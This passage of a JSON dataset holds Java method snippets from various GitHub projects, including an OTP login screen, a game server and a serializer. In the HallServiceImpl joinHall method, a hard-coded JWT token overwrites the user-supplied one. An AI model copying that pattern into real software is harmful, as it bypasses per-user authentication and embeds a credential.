\"\";\n        for( int i = 0; i < sort.size(); i++ )\n        {\n            String value = null;\n            int order = sort.get( i );\n            if( order == 1 ) // \u0423\u043b\u0438\u0446\u0430\n                value = \" streetid\";\n            if( order == 2 ) // \u0414\u043e\u043c\n                value = \" homeN*1\";\n            if( order == 3 ) // \u041a\u0432\u0430\u0440\u0442\u0438\u0440\u0430\n                value = \" flat*1\";\n            if( order == 4 ) // \u0411\u0430\u043b\u0430\u043d\u0441\n                value = \" balance\"; // DESC\n\n            if( value != null )\n            {\n                result += (i > 0 ? \",\" : \"\") + value;\n            }\n        }\n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/srcx/doc/plugin/report/_res/ReportCustomDebtors.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58658, "method_name": "getGroupMask", "class_name": "ReportCustomDebtors", "params": ["Set<Integer>"], "throws": null, "modifiers": ["private"], "return_type": "long", "snippet": "    private long getGroupMask( Set<Integer> groups )\n    {\n        long result = 0L;\n        if( groups != null && groups.size() > 0 )\n        {\n            for( int id : groups )\n            {\n                if( id >= 0 )\n                    result |= 1L << id;\n            }\n        }\n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/srcx/doc/plugin/report/_res/ReportCustomDebtors.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58659, "method_name": "dropTables", "class_name": "ReportCustomDebtors", "params": ["Connection"], "throws": ["SQLException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void dropTables( Connection con ) throws SQLException\n    {\n        con.createStatement().executeUpdate( \"DROP TEMPORARY TABLE IF EXISTS \" + tableGroupName );\n        con.createStatement().executeUpdate( \"DROP TEMPORARY TABLE IF EXISTS \" + tableBalance );\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/srcx/doc/plugin/report/_res/ReportCustomDebtors.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58660, "method_name": "builder", "class_name": "BuilderFactory", "params": ["Map<String,Object>", "String", "String", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void builder(Map<String,Object> modelMap,// \u6570\u636e\u6a21\u578b\n                                String templatePath, // \u6a21\u677f\u8def\u5f84\n                                String templateFile, // \u6a21\u677f\u6587\u4ef6\n                                String storePath,    // \u5b58\u50a8\u8def\u5f84\n                                String suffix){      // \u751f\u6210\u6587\u4ef6\u540e\u7f00\u540d\u5b57\n        try {\n            // \u83b7\u53d6\u6a21\u677f\u5bf9\u8c61\n            Template template = TemplateUtil.loadTemplate(ControllerBuilder.class.getResource(templatePath).getPath(), templateFile);\n\n            // \u521b\u5efa\u6587\u4ef6\u5939\n            String path = TemplateBuilder.PROJECT_PATH+storePath.replace(\".\",\"/\");\n            File file = new File(path);\n            if(!file.exists()){\n                file.mkdirs();\n            }\n            // \u521b\u5efa\u6587\u4ef6\n            TemplateUtil.writer(template,modelMap,path+\"/\"+modelMap.get(\"Table\")+suffix);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/pkxing/CodeGenerator/master/CodeGenerator/src/main/java/com/pkx/code/build/BuilderFactory.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58661, "method_name": "init", "class_name": "HallServiceImpl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {\n        sdkUserService = GetBeanUtil.getBean(SdkUserService.class);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/service/impl/HallServiceImpl.java", "stars": "1", "class_props": {"extends": "abstractService", "implements": ["HallService"], "modifiers": ["public"]}}, {"id": 58662, "method_name": "invokeMethod", "class_name": "HallServiceImpl", "params": ["short", "Request", "DataPacket"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void invokeMethod(short cmd, Request request, DataPacket dataPacket) {\n        super.invokeMethod(cmd,request,dataPacket);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/service/impl/HallServiceImpl.java", "stars": "1", "class_props": {"extends": "abstractService", "implements": ["HallService"], "modifiers": ["public"]}}, {"id": 58663, "method_name": "joinHall", "class_name": "HallServiceImpl", "params": ["Request", "JSONObject"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void joinHall(Request request, JSONObject jsonObject) {\n        String token = jsonObject.getString(Const.Constant.TOKEN);\n        token = \"eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjE1Nzg0MDQ0ODcsInN1YiI6IjEyMzQ1Njc4OTFfMTAwMyIsImlhdCI6MTU3ODM4Mjg4Nzg5OH0.rLHugb6ocTmwT9zS9fXG541xnkyGlAZrXThCsjC0UU3-0PutubXeTi9HAVpe8C_kYinA6Bfl9umP9jrZefOQdA\";\n        Integer gameId = HallInitializer.baseLocalMemory.getHallGameMgr().getHallGameMap().get(Const.Constant.CHANNEL).getGameId();\n        SdkUser sdkUser = sdkUserService.getSdkUser(request,token,gameId,Const.Number.ONE);\n        if (Objects.isNull(sdkUser)) {\n            log.error(\"\u73a9\u5bb6\u4e0d\u5b58\u5728\");\n        }\n        Player player = new Player(sdkUser.getSdkUserId());\n        //\u903b\u8f91\u5904\u7406\n        HallInitializer.baseLocalMemory.getHallGameMgr().getPlayerList().add(player);\n\n        byte[] bytes = JSONObject.toJSONBytes(player);\n        //\u53d1\u9001\u7528\u6237\u52a0\u5165\u5927\u5385\u534f\u8bae\n        AbstractNetMessage abstractNetMessage = new AbstractNetMessage(new NetMessageBody(bytes), MessageKey.SERVER_CONFIGS.getKey());\n        ByteBuf byteBuf = messageEncoderFactoryApp.createByteBuf(abstractNetMessage);\n        request.sendAndFlush(byteBuf);\n    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/service/impl/HallServiceImpl.java", "stars": "1", "class_props": {"extends": "abstractService", "implements": ["HallService"], "modifiers": ["public"]}}, {"id": 58664, "method_name": "hasMoreElements", "class_name": "Enumeration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean hasMoreElements() {\n        return iterator != null && iterator.hasNext();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/Enumeration.java", "stars": "16", "class_props": {"extends": "DvmObject", "implements": null, "modifiers": ["public"]}}, {"id": 58665, "method_name": "nextElement", "class_name": "Enumeration", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DvmObject<?>", "snippet": "    public DvmObject<?> nextElement() {\n        return iterator.next();\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/linux/android/dvm/Enumeration.java", "stars": "16", "class_props": {"extends": "DvmObject", "implements": null, "modifiers": ["public"]}}, {"id": 58666, "method_name": "addService", "class_name": "JamepadManager", "params": ["DefaultJamepadService"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void addService(final DefaultJamepadService service) {\n        if (pool.isEmpty()) {\n            manager.initSDLGamepad();\n        }\n        pool.add(service);\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/client/src/main/java/com/javmarina/client/JamepadManager.java", "stars": "17", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58667, "method_name": "removeService", "class_name": "JamepadManager", "params": ["DefaultJamepadService"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void removeService(final DefaultJamepadService service) {\n        pool.remove(service);\n        if (pool.isEmpty()) {\n            manager.quitSDLGamepad();\n        }\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/client/src/main/java/com/javmarina/client/JamepadManager.java", "stars": "17", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58668, "method_name": "update", "class_name": "JamepadManager", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void update() {\n        manager.update();\n    }", "url": "https://raw.githubusercontent.com/javmarina/Nintendo-Switch-Remote-Control/master/gui/client/src/main/java/com/javmarina/client/JamepadManager.java", "stars": "17", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58669, "method_name": "createNativeModules", "class_name": "MapsPackage", "params": ["ReactApplicationContext"], "throws": null, "modifiers": ["public"], "return_type": "List<NativeModule>", "snippet": "    public List<NativeModule> createNativeModules(ReactApplicationContext reactContext) {\n        return Arrays.<NativeModule>asList();\n    }", "url": "https://raw.githubusercontent.com/BluezoneGlobal/react-native-bluetooth-scan/master/lib/android/src/main/java/com/scan/MapsPackage.java", "stars": "14", "class_props": {"extends": null, "implements": ["ReactPackage"], "modifiers": ["public"]}}, {"id": 58670, "method_name": "createJSModules", "class_name": "MapsPackage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Class>", "snippet": "    public List<Class<? extends JavaScriptModule>> createJSModules() {\n        return Collections.emptyList();\n    }", "url": "https://raw.githubusercontent.com/BluezoneGlobal/react-native-bluetooth-scan/master/lib/android/src/main/java/com/scan/MapsPackage.java", "stars": "14", "class_props": {"extends": null, "implements": ["ReactPackage"], "modifiers": ["public"]}}, {"id": 58671, "method_name": "createViewManagers", "class_name": "MapsPackage", "params": ["ReactApplicationContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ViewManager>", "snippet": "    public List<ViewManager> createViewManagers(ReactApplicationContext reactContext) {\n        return Arrays.<ViewManager>asList();\n    }", "url": "https://raw.githubusercontent.com/BluezoneGlobal/react-native-bluetooth-scan/master/lib/android/src/main/java/com/scan/MapsPackage.java", "stars": "14", "class_props": {"extends": null, "implements": ["ReactPackage"], "modifiers": ["public"]}}, {"id": 58672, "method_name": "onEntityAdded", "class_name": "MixinWorld", "params": ["Entity", "CallbackInfo"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onEntityAdded(Entity entityIn, CallbackInfo callbackInfo) {\n        PlayerEvent event = new PlayerEvent(PlayerEvent.Type.ENTERING, entityIn);\n        Mercury.INSTANCE.getEventManager().fireEvent(event);\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinWorld.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58673, "method_name": "onEntityRemoved", "class_name": "MixinWorld", "params": ["Entity", "CallbackInfo"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onEntityRemoved(Entity entityIn, CallbackInfo callbackInfo) {\n        PlayerEvent event = new PlayerEvent(PlayerEvent.Type.EXITING, entityIn);\n        Mercury.INSTANCE.getEventManager().fireEvent(event);\n    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/mixin/MixinWorld.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58674, "method_name": "decode", "class_name": "MessagePackDecoder", "params": ["ChannelHandlerContext", "ByteBuf", "List<Object>"], "throws": ["Exception"], "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void decode(ChannelHandlerContext ctx, ByteBuf msg, List<Object> out) throws Exception {\n    final byte[] array;\n    final int length = msg.readableBytes();\n    array = new byte[length];\n    msg.getBytes(msg.readerIndex(), array, 0, length);\n    MessagePack pack = new MessagePack();\n    out.add(pack.read(array, Object.class));\n  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/MessagePackDecoder.java", "stars": "3", "class_props": {"extends": "MessageToMessageDecoder", "implements": null, "modifiers": ["public"]}}, {"id": 58675, "method_name": "onCreateView", "class_name": "LoginLocalUsingOTPFragment", "params": ["LayoutInflater", "ViewGroup", "Bundle"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View onCreateView(LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {\n        super.onCreateView(inflater, container, savedInstanceState);\n\n        setRetainInstance(true);\n        View rootView = inflater.inflate(R.layout.fragment_login_using_otp_local, container, false);\n        ButterKnife.bind(this,rootView);\n\n\n        if(getChildFragmentManager().findFragmentByTag(TAG_SERVICE_INDICATOR)==null)\n        {\n            getChildFragmentManager()\n                    .beginTransaction()\n                    .replace(R.id.service_indicator,new ServiceIndicatorFragment(),TAG_SERVICE_INDICATOR)\n                    .commit();\n        }\n\n\n\n        return rootView;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Login/Backups/LoginLocalUsingOTPFragment.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 58676, "method_name": "showToastMessage", "class_name": "LoginLocalUsingOTPFragment", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void showToastMessage(String message)\n    {\n        Toast.makeText(getActivity(),message, Toast.LENGTH_SHORT).show();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Login/Backups/LoginLocalUsingOTPFragment.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 58677, "method_name": "validateData", "class_name": "LoginLocalUsingOTPFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean validateData()\n    {\n        boolean isValid = true;\n//        boolean phoneValidity = false;\n//        boolean emailValidity = false;\n//\n//\n//        emailValidity = EmailValidator.getInstance().isValid(username.getText().toString());\n//        phoneValidity = android.util.Patterns.PHONE.matcher(username.getText().toString()).matches();\n\n\n\n        if(password.getText().toString().isEmpty())\n        {\n            password.requestFocus();\n            password.setError(\"Please Enter OTP !\");\n            isValid = false;\n        }\n\n\n\n//        if(!phoneValidity)\n//        {\n//            username.setError(\"Not a valid phone !\");\n//            username.requestFocus();\n//\n//            isValid = false;\n//        }\n//\n//        if(username.getText().toString().isEmpty())\n//        {\n//            password.requestFocus();\n//            username.setError(\"Please enter phone !\");\n//            username.requestFocus();\n//\n//            isValid = false;\n//        }\n//        else if(username.getText().toString().length()!=10)\n//        {\n//            username.setError(\"Enter a valid phone number !\");\n//            username.requestFocus();\n//\n//            isValid = false;\n//        }\n\n\n\n\n\n        // phone and password both needs to be valid\n        isValid = validatePhone() && isValid;\n\n\n\n\n        return isValid;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Login/Backups/LoginLocalUsingOTPFragment.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 58678, "method_name": "validatePhone", "class_name": "LoginLocalUsingOTPFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "    private boolean validatePhone()\n    {\n\n\n        boolean isValid = true;\n        boolean phoneValidity = false;\n//        boolean emailValidity = false;\n//\n//\n//        emailValidity = EmailValidator.getInstance().isValid(username.getText().toString());\n        phoneValidity = android.util.Patterns.PHONE.matcher(username.getText().toString()).matches();\n\n\n        if(username.getText().toString().isEmpty())\n        {\n//            password.requestFocus();\n            username.setError(\"Please enter phone !\");\n            username.requestFocus();\n\n            isValid = false;\n        }\n//        else if(username.getText().toString().length()!=10)\n//        {\n//            username.setError(\"Enter a valid phone number !\");\n//            username.requestFocus();\n//\n//            isValid = false;\n//        }\n\n\n        if(!phoneValidity)\n        {\n            username.setError(\"Invalid phone number !\");\n            isValid = false;\n        }\n\n\n\n        return isValid;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Login/Backups/LoginLocalUsingOTPFragment.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 58679, "method_name": "onStart", "class_name": "LoginLocalUsingOTPFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onStart() {\n        super.onStart();\n        isDestroyed= false;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Login/Backups/LoginLocalUsingOTPFragment.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 58680, "method_name": "onDestroyView", "class_name": "LoginLocalUsingOTPFragment", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDestroyView() {\n        super.onDestroyView();\n        isDestroyed= true;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Login/Backups/LoginLocalUsingOTPFragment.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 58681, "method_name": "loginButtonClick", "class_name": "LoginLocalUsingOTPFragment", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void loginButtonClick()\n    {\n        if(textInputPassword.getVisibility()==View.GONE)\n        {\n            sendOTP();\n        }\n        else if (textInputPassword.getVisibility()==View.VISIBLE)\n        {\n            makeRequestLogin();\n        }\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Login/Backups/LoginLocalUsingOTPFragment.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 58682, "method_name": "makeRequestLogin", "class_name": "LoginLocalUsingOTPFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void makeRequestLogin()\n    {\n\n        if(!validateData())\n        {\n            // validation failed return\n            return;\n        }\n\n\n\n        final String phoneWithCode = username.getText().toString();\n//        final String phoneWithCode = ccp.getSelectedCountryCode()+ username.getText().toString();\n\n        progressBar.setVisibility(View.VISIBLE);\n        loginButton.setVisibility(View.INVISIBLE);\n\n\n        Retrofit retrofit = new Retrofit.Builder()\n                .addConverterFactory(GsonConverterFactory.create(gson))\n                .baseUrl(PrefGeneral.getServiceURL(MyApplication.getAppContext()))\n                .client(new OkHttpClient().newBuilder().build())\n                .build();\n\n\n\n        Call<User> call = retrofit.create(LoginUsingOTPService.class).getProfileWithLogin(\n                PrefLogin.baseEncoding(phoneWithCode,password.getText().toString())\n        );\n\n\n\n        call.enqueue(new Callback<User>() {\n            @Override\n            public void onResponse(Call<User> call, Response<User> response) {\n\n                if(isDestroyed)\n                {\n                    return;\n                }\n\n                progressBar.setVisibility(View.GONE);\n                loginButton.setVisibility(View.VISIBLE);\n\n                if(response.code()==200)\n                {\n                    // save username and password\n\n\n\n//                    if(response.body().getRole()!=User.ROLE_END_USER_CODE)\n//                    {\n//                        showToastMessage(\"Only an End-User is allowed to login\");\n//                        return;\n//                    }\n\n                    User user = response.body();\n\n\n\n                    PrefLogin.saveToken(\n                            getActivity(),\n                            user.getPhone(),\n                            user.getToken()\n                    );\n\n\n\n\n\n                    // save token and token expiry timestamp\n//                    PrefLogin.saveToken(\n//                            getActivity(),\n//                            response.body().getToken(),\n//                            response.body().getTimestampTokenExpires()\n//                    );\n\n\n                    // save user profile information\n                    PrefLogin.saveUserProfile(\n                            response.body(),\n                            getActivity()\n                    );\n\n\n\n\n\n\n\n\n\n//                    PrefOneSignal.saveToken(getActivity(),PrefOneSignal.getLastToken(getActivity()));\n//\n//                    if(PrefOneSignal.getToken(getActivity())!=null)\n//                    {\n//                        // update one signal id if its not updated\n//                        getActivity().startService(new Intent(getActivity(), UpdateOneSignalID.class));\n//                    }\n\n\n\n\n\n\n\n\n\n\n                    if(getActivity() instanceof NotifyAboutLogin)\n                    {\n//                        showToastMessage(\"Notify about login !\");\n                        ((NotifyAboutLogin) getActivity()).loginSuccess();\n                    }\n\n\n\n//                        getActivity().finish();\n\n\n//                    showToastMessage(\"LoginUsingOTP success : code : \" + String.valueOf(response.code()));\n\n\n\n                }\n                else\n                {\n                    showToastMessage(\"Login Failed : Phone or OTP is incorrect !\");\n//                    System.out.println(\"Login Failed : Code \" + String.valueOf(response.code()));\n                }\n\n            }\n\n\n\n\n            @Override\n            public void onFailure(Call<User> call, Throwable t) {\n\n                if(isDestroyed)\n                {\n                    return;\n                }\n                showToastMessage(\"Network connection problem !\");\n                progressBar.setVisibility(View.GONE);\n                loginButton.setVisibility(View.VISIBLE);\n            }\n        });\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Login/Backups/LoginLocalUsingOTPFragment.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 58683, "method_name": "sendOTP", "class_name": "LoginLocalUsingOTPFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void sendOTP()\n    {\n\n        if(!validatePhone())\n        {\n            // validation failed return\n            return;\n        }\n\n\n\n//        final String phoneWithCode = username.getText().toString();\n//        final String phoneWithCode = ccp.getSelectedCountryCode()+ username.getText().toString();\n\n\n        String phoneWithCode = \"\";\n\n        if(registrationMode==User.REGISTRATION_MODE_PHONE)\n        {\n            phoneWithCode = ccp.getSelectedCountryCode()+ username.getText().toString();\n        }\n        else if(registrationMode==User.REGISTRATION_MODE_EMAIL)\n        {\n            phoneWithCode = username.getText().toString();\n        }\n\n\n\n\n        progressBar.setVisibility(View.VISIBLE);\n        loginButton.setVisibility(View.INVISIBLE);\n\n\n        Retrofit retrofit = new Retrofit.Builder()\n                .addConverterFactory(GsonConverterFactory.create(gson))\n                .baseUrl(PrefGeneral.getServiceURL(MyApplication.getAppContext()))\n                .client(new OkHttpClient().newBuilder().build())\n                .build();\n\n\n\n\n        Call<ResponseBody> call = retrofit.create(UserService.class).sendVerificationPhone(\n                phoneWithCode\n        );\n\n\n\n        textInputPassword.setVisibility(View.VISIBLE);\n        loginButton.setText(\"Login\");\n\n\n\n\n        call.enqueue(new Callback<ResponseBody>() {\n            @Override\n            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {\n\n\n                if(isDestroyed)\n                {\n                    return;\n                }\n\n                progressBar.setVisibility(View.GONE);\n                loginButton.setVisibility(View.VISIBLE);\n\n\n\n                if(response.code()==200) {\n                    // save username and password\n\n//                    showToastMessage(\"OTP Sent !\");\n                }\n                else\n                {\n                    showToastMessage(\"Failed to send OTP ... failed Code : \" + response.code());\n                }\n\n\n                }\n\n            @Override\n            public void onFailure(Call<ResponseBody> call, Throwable t) {\n\n\n                if(isDestroyed)\n                {\n                    return;\n                }\n\n                showToastMessage(\"Failed ... Please check your network !\");\n\n                progressBar.setVisibility(View.GONE);\n                loginButton.setVisibility(View.VISIBLE);\n\n\n\n            }\n        });\n\n\n\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Login/Backups/LoginLocalUsingOTPFragment.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 58684, "method_name": "selectPhoneClick", "class_name": "LoginLocalUsingOTPFragment", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void selectPhoneClick()\n    {\n        registrationMode = User.REGISTRATION_MODE_PHONE;\n        bindRegistrationMode();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Login/Backups/LoginLocalUsingOTPFragment.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 58685, "method_name": "selectEmailClick", "class_name": "LoginLocalUsingOTPFragment", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void selectEmailClick()\n    {\n        registrationMode= User.REGISTRATION_MODE_EMAIL;\n        bindRegistrationMode();\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Login/Backups/LoginLocalUsingOTPFragment.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 58686, "method_name": "bindRegistrationMode", "class_name": "LoginLocalUsingOTPFragment", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void bindRegistrationMode()\n    {\n        if(registrationMode==User.REGISTRATION_MODE_EMAIL)\n        {\n            selectEmail.setTextColor(ContextCompat.getColor(getActivity(),R.color.white));\n            selectEmail.setBackgroundColor(ContextCompat.getColor(getActivity(),R.color.buttonColor));\n\n            selectPhone.setTextColor(ContextCompat.getColor(getActivity(),R.color.blueGrey800));\n            selectPhone.setBackgroundColor(ContextCompat.getColor(getActivity(),R.color.light_grey));\n\n            ccp.setVisibility(View.GONE);\n\n            username.setInputType(InputType.TYPE_CLASS_TEXT);\n            username.setHint(\"Enter Email\");\n\n        }\n        else if(registrationMode==User.REGISTRATION_MODE_PHONE)\n        {\n            selectEmail.setTextColor(ContextCompat.getColor(getActivity(),R.color.blueGrey800));\n            selectEmail.setBackgroundColor(ContextCompat.getColor(getActivity(),R.color.light_grey));\n\n            selectPhone.setTextColor(ContextCompat.getColor(getActivity(),R.color.white));\n            selectPhone.setBackgroundColor(ContextCompat.getColor(getActivity(),R.color.buttonColor));\n\n            ccp.setVisibility(View.VISIBLE);\n\n\n            ccp.setCountryForNameCode(\"IN\");\n            ccp.setCcpClickable(false);\n\n\n            username.setInputType(InputType.TYPE_CLASS_PHONE);\n            username.setHint(\"Enter Phone\");\n        }\n\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Login/Backups/LoginLocalUsingOTPFragment.java", "stars": "10", "class_props": {"extends": "Fragment", "implements": null, "modifiers": ["public"]}}, {"id": 58687, "method_name": "wrap", "class_name": "ODS", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "Tag<?>", "snippet": "    public static Tag<?> wrap(Object o){\n        return wrap(\"\", o);\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58688, "method_name": "wrap", "class_name": "ODS", "params": ["String", "Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "Tag<?>", "snippet": "    public static Tag<?> wrap(String name, Object o){\n        if(o instanceof Byte){\n            return new ByteTag(name, (byte) o);\n        }\n        if(o instanceof Character){\n            return new CharTag(name, (char) o);\n        }\n        if(o instanceof Double){\n            return new DoubleTag(name, (double) o);\n        }\n        if(o instanceof Float){\n            return new FloatTag(name, (float) o);\n        }\n        if(o instanceof Integer){\n            return new IntTag(name, (int) o);\n        }\n        if(o instanceof Long){\n            return new LongTag(name, (long) o);\n        }\n        if(o instanceof Short){\n            return new ShortTag(name, (short) o);\n        }\n        if(o instanceof String){\n            return new StringTag(name, (String) o);\n        }\n        if(o instanceof List){\n            return wrap(name, (List<?>) o);\n        }\n        return serialize(name, o);\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58689, "method_name": "unwrap", "class_name": "ODS", "params": ["Tag<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "T", "snippet": "    public static <T> T unwrap(Tag<T> tag){\n        if(tag instanceof ObjectTag){\n            try{\n                ObjectTag objTag = (ObjectTag) tag;\n                String clazzName = (String) objTag.getTag(\"ODS_TAG\").getValue();\n                if(clazzName == null) throw new RuntimeException(\"Cannot unwrap object: TagObject is not a serialized object!\");\n                return (T) deserialize(tag, Class.forName(clazzName));\n            }catch(ClassNotFoundException ex){\n                ex.printStackTrace();\n            }\n        }\n        return tag.getValue();\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58690, "method_name": "wrap", "class_name": "ODS", "params": ["String", "List<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "ListTag<?>", "snippet": "    public static <T> ListTag<?> wrap(String name, List<T> list){\n        List<Tag<?>> output = new ArrayList<>();\n        for(T t : list){\n            output.add(wrap(t));\n        }\n        return new ListTag<>(name, output);\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58691, "method_name": "wrap", "class_name": "ODS", "params": ["List<T>"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<Tag>", "snippet": "    public static <T> List<Tag<?>> wrap(List<T> list){\n        List<Tag<?>> output = new ArrayList<>();\n        for(T t : list){\n            output.add(wrap(t));\n        }\n        return output;\n    }", "url": "https://raw.githubusercontent.com/ryandw11/ODS/master/src/main/java/me/ryandw11/ods/ODS.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58692, "method_name": "unwrapList", "class_name": "ODS", "params": ["List<Tag>"], "throws": null, "modifiers": ["public", "static"], "return_type": "List<T>", "snippet": "    public static <T> List<T> unwrapList(List<Tag<T>> tags){\n        List<T> output = new ArrayList<>();\n        for(Tag<T> tag : tags){\n            output.add(unwrap(tag));\n        }\n        return output;\n    }", "url": 